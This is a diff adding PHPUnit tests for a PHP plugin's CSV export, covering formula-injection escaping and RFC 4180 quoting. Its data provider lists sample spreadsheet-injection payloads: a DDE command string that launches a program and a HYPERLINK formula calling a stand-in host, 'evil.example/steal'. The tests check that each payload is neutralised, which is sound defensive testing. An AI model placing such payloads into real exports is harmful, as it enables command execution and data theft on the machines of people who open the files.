@@ -206,4 +206,146 @@ class HelpersTest extends TestCase {
 		$helpers = new Helpers();
 		$this->assertTrue( $helpers->update_settings( array( 'mode' => '' ) ) );
 	}
+
+	// ------------------------------------------------------------------
+	// CSV export escaping (formula injection)
+	// ------------------------------------------------------------------
+
+	/**
+	 * A plain value should pass through the CSV escaper untouched.
+	 */
+	public function test_escape_csv_value_leaves_plain_values_unchanged() {
+		$helpers = new Helpers();
+		$this->assertSame( '/some/missing/page', $helpers->escape_csv_value( '/some/missing/page' ) );
+		$this->assertSame( 'Mozilla/5.0 (X11; Linux x86_64)', $helpers->escape_csv_value( 'Mozilla/5.0 (X11; Linux x86_64)' ) );
+	}
+
+	/**
+	 * An empty value should stay empty rather than gain a prefix.
+	 */
+	public function test_escape_csv_value_leaves_empty_string_unchanged() {
+		$helpers = new Helpers();
+		$this->assertSame( '', $helpers->escape_csv_value( '' ) );
+	}
+
+	/**
+	 * Values a spreadsheet would evaluate as a formula must be prefixed so they
+	 * are rendered as literal text instead. The referer and user agent columns
+	 * are attacker-controlled, so these reach the export from the outside world.
+	 *
+	 * @dataProvider csv_formula_provider
+	 * @param string $dangerous Value that a spreadsheet would evaluate.
+	 */
+	public function test_escape_csv_value_neutralizes_formula_payloads( string $dangerous ) {
+		$helpers = new Helpers();
+		$escaped = $helpers->escape_csv_value( $dangerous );
+
+		$this->assertSame( "'" . $dangerous, $escaped, 'Formula payloads must be prefixed with an apostrophe.' );
+		$this->assertNotSame( $dangerous, $escaped );
+		$this->assertStringStartsWith( "'", $escaped );
+	}
+
+	/**
+	 * Supplies representative CSV injection payloads.
+	 *
+	 * @return array<string, array<string>>
+	 */
+	public function csv_formula_provider(): array {
+		return array(
+			'equals command'   => array( "=cmd|' /C calc'!A0" ),
+			'equals hyperlink' => array( '=HYPERLINK("https://evil.example/steal","click")' ),
+			'plus prefix'      => array( '+1+1' ),
+			'minus prefix'     => array( '-1+1' ),
+			'at prefix'        => array( '@SUM(1+1)' ),
+			'tab prefix'       => array( "\t=1+1" ),
+			'carriage return'  => array( "\r=1+1" ),
+		);
+	}
+
+	/**
+	 * Non-string scalars should be cast rather than trigger a type error.
+	 */
+	public function test_escape_csv_value_casts_non_string_input() {
+		$helpers = new Helpers();
+		$this->assertSame( '42', $helpers->escape_csv_value( 42 ) );
+		$this->assertSame( '', $helpers->escape_csv_value( null ) );
+	}
+
+	// ------------------------------------------------------------------
+	// CSV row writing
+	// ------------------------------------------------------------------
+
+	/**
+	 * Writing a CSV row must not raise a deprecation on PHP 8.4+.
+	 *
+	 * PHP 8.4 deprecates calling fputcsv() without an explicit $escape. On a
+	 * site with WP_DEBUG display enabled the notice would be written straight
+	 * into the download stream and corrupt the exported file, so this promotes
+	 * any deprecation to a failure.
+	 */
+	public function test_write_csv_row_raises_no_deprecation() {
+		$raised  = array();
+		$previous = set_error_handler(
+			function ( $errno, $errstr ) use ( &$raised ) {
+				$raised[] = $errstr;
+				return true;
+			},
+			E_ALL
+		);
+
+		$helpers = new Helpers();
+		$handle  = fopen( 'php://memory', 'w+' );
+		$helpers->write_csv_row( $handle, array( 'a', 'b' ) );
+		fclose( $handle );
+
+		set_error_handler( $previous );
+
+		$this->assertSame( array(), $raised, 'Writing a CSV row must not raise any notice or deprecation.' );
+	}
+
+	/**
+	 * Quotes are escaped by doubling, per RFC 4180, not with a backslash.
+	 */
+	public function test_write_csv_row_uses_rfc4180_quoting() {
+		$helpers = new Helpers();
+		$handle  = fopen( 'php://memory', 'w+' );
+		$helpers->write_csv_row( $handle, array( 'say "hi"', 'a,b', "line\nbreak" ) );
+		rewind( $handle );
+		$written = stream_get_contents( $handle );
+		fclose( $handle );
+
+		$this->assertStringContainsString( '"say ""hi"""', $written, 'Quotes must be doubled, not backslash-escaped.' );
+		$this->assertStringContainsString( '"a,b"', $written, 'Values containing a comma must be quoted.' );
+	}
+
+	/**
+	 * A backslash in a log value must survive the export unchanged.
+	 *
+	 * User agents contain backslashes. The historical fputcsv() default would
+	 * consume them as escape characters.
+	 */
+	public function test_write_csv_row_preserves_backslashes() {
+		$helpers = new Helpers();
+		$handle  = fopen( 'php://memory', 'w+' );
+		$helpers->write_csv_row( $handle, array( 'C:\\Windows\\System32' ) );
+		rewind( $handle );
+		$written = stream_get_contents( $handle );
+		fclose( $handle );
+
+		$this->assertStringContainsString( 'C:\\Windows\\System32', $written );
+	}
+
+	/**
+	 * A formula payload must still be neutralised once written through the writer.
+	 */
+	public function test_escaped_formula_survives_csv_writing_as_text() {
+		$helpers = new Helpers();
+		$handle  = fopen( 'php://memory', 'w+' );
+		$helpers->write_csv_row( $handle, array( $helpers->escape_csv_value( '=1+1' ) ) );
+		rewind( $handle );
+		$written = stream_get_contents( $handle );
+		fclose( $handle );
+
+		$this->assertStringStartsWith( "'=1+1", $written, 'The written cell must keep the neutralising prefix.' );
+	}
 }
